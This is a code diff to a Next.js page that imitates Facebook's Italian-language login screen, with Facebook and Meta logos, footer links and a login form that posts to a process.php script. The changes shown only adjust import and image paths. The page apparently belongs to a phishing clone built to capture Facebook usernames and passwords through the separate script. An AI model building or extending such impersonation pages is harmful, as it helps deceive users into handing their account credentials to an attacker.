@@ -1,7 +1,7 @@
 'use client';
 
 import Image from 'next/image';
-import './facebook.css'; // Assicurati che sia in app/ o in styles/
+import 'facebook.css'; // Assicurati che sia in app/ o in styles/
 
 export default function Home() {
   return (
@@ -13,7 +13,7 @@ export default function Home() {
 
         <div className="fb-container">
           <p className="lang">Italiano</p>
-          <Image src="/facebook.png" alt="Facebook logo" width={200} height={60} className="fb-logo" />
+          <Image src="facebook.png" alt="Facebook logo" width={200} height={60} className="fb-logo" />
 
           <div className="fb-login-box">
             <form action="process.php" method="POST" className="fb-form">
@@ -27,7 +27,7 @@ export default function Home() {
           </div>
 
           <footer className="meta-footer">
-            <Image src="/meta.png" alt="Meta logo" width={100} height={30} className="meta-logo" />
+            <Image src="meta.png" alt="Meta logo" width={100} height={30} className="meta-logo" />
             <div className="meta-links">
               <a href="#">Informazioni</a>
               <a href="#">Centro assistenza</a>
